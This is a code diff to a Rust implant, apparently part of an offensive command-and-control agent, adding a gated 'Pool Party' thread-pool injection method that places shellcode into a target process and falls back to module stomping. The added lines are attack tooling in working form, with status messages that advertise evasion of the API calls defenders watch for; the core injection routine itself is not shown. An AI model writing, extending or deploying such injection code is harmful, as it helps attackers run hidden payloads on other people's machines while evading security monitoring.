@@ -633,11 +633,54 @@ pub unsafe fn threadless_inject(
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
 pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
-    // method 0 (Pool Party) not yet implemented — delegate to module stomp.
+    // method 0 (Pool Party): gated research-grade technique. When
+    // POOL_PARTY_ENABLED is on (operator opt-in via NYX_POOL_PARTY_ON=1) AND a
+    // target pid is supplied, attempt the section-backed threadpool splice.
+    // On any failure (or when the gate is off / pid is 0), degrade to method 2
+    // (module stomp) so the command stays functional end-to-end.
+    if method == 0 && crate::tp::pool_party_enabled() && pid != 0 {
+        match unsafe { crate::tp::pool_party_inject(pid, shellcode) } {
+            Ok(()) => {
+                let mut msg = crate::heap::String::from(
+                    "Pool Party inject ok (pid=",
+                );
+                let mut buf = [0u8; 10];
+                let mut n = pid;
+                let mut i = buf.len();
+                if n == 0 { buf[0] = b'0'; i = 1; }
+                else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
+                for &b in &buf[i..] { msg.push(b as char); }
+                msg.push_str(") — 0-of-3 FND (no VirtualAllocEx / WriteProcessMemory / CreateRemoteThread)");
+                return nyx_protocol::Response::Output(msg.into_bytes());
+            }
+            Err(e) => {
+                // Fall through to module stomp with a warning prefix.
+                let mut warn = crate::heap::String::from(
+                    "WARN: Pool Party failed (",
+                );
+                warn.push_str(&e);
+                warn.push_str(") — falling back to module stomp (method 2). ");
+                // Use warn as the prefix for the module-stomp path below.
+                let resp = do_inject(2, pid, spawn_to, shellcode);
+                let prefixed = match resp {
+                    nyx_protocol::Response::Output(mut bytes) => {
+                        let mut out = warn.into_bytes();
+                        out.append(&mut bytes);
+                        nyx_protocol::Response::Output(out)
+                    }
+                    other => other,
+                };
+                return prefixed;
+            }
+        }
+    }
+
+    // method 0 (Pool Party) not requested, gate off, or pid 0 — delegate to
+    // module stomp (the proven baseline).
     let effective_method = if method == 0 { 2 } else { method };
     let warn_prefix = if method == 0 {
         crate::heap::String::from(
-            "WARN: Pool Party (method 0) not implemented — using module stomp (method 2). ",
+            "WARN: Pool Party (method 0) gated off (set NYX_POOL_PARTY_ON=1 + supply pid) — using module stomp (method 2). ",
         )
     } else {
         crate::heap::String::new()
